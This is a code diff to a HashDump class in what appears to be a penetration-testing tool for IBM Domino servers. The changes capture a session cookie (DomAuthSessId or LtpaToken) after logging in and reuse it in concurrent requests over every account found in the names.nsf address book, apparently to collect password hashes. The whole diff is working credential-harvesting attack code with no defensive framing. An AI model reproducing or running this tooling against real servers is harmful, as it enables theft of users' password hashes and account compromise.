@@ -32,6 +32,7 @@ class HashDump(object):
 		self.domiowned = domiowned
 		self.username = username
 		self.password = password
+		self.session_id = None
 
 		self.accounts = []
 
@@ -42,6 +43,12 @@ class HashDump(object):
 		for page in range(1, sys.maxsize**10, 1000):
 			endpoint = "names.nsf/74eeb4310586c7d885256a7d00693f10?ReadForm&Start={0}&Count=1000".format(page)
 			response = self.domiowned.authenticate(self.username, self.password, endpoint)
+
+			if 'DomAuthSessId' in self.domiowned.session.cookies:
+				self.session_id = dict(DomAuthSessId=self.domiowned.session.cookies['DomAuthSessId'])
+			elif 'LtpaToken' in self.domiowned.session.cookies:
+				self.session_id = dict(LtpaToken=self.domiowned.session.cookies['LtpaToken'])
+
 			if response.status_code == 200:
 				soup = BeautifulSoup(response.text, 'lxml')
 
@@ -67,13 +74,7 @@ class HashDump(object):
 		sem = asyncio.Semaphore(40)
 		loop = asyncio.get_event_loop()
 		f = asyncio.wait([self._send_requests(account, sem) for account in self.accounts])
-		try:
-			loop.run_until_complete(f)
-		except KeyboardInterrupt:
-			print('Terminating hash dump')
-		finally:
-			loop.stop()
-			loop.close()
+		loop.run_until_complete(f)
 
 	@asyncio.coroutine
 	def _send_requests(self, account, sem):
@@ -91,7 +92,7 @@ class HashDump(object):
 					'GET',
 					account,
 					headers=self.domiowned.HEADERS,
-					cookies=dict(DomAuthSessId=self.domiowned.session.cookies['DomAuthSessId']),
+					cookies=self.session_id,
 					compress=True
 				)
 			else:
